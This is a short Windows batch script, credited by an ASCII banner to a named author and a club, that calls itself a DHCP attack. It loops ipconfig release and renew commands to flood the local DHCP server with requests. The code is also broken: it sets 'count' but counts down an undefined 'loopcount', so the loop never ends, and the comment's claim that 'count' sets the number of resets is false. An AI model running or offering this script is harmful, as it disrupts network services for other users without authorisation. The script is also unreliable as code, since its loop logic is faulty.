REM This program performs a DHCP attack by constantly resetting an IP
REM You can change the number of times you reset the IP by changing the set value of variable count
echo Program developed by
echo Cyrus Majd
echo In contribution to
echo ~ =============================================== ~
echo ` -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- `
echo ` #     # #     #  #####   #####   #####  ####### `
echo ` #     # #     # #     # #     # #     #    #    `
echo ` #     # #     # #       #       #          #    `
echo ` ####### #######  #####  #        #####     #    `
echo ` #     # #     #       # #             #    #    `
echo ` #     # #     # #     # #     # #     #    #    `
echo ` #     # #     #  #####   #####   #####     #    `
echo ` -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- `
echo ~ =============================================== ~
@echo off
set count=100
:loop
ipconfig /release
ipconfig /renew
set /a loopcount=loopcount-1
if %loopcount%==0 goto exitloop
goto loop
:exitloop
pause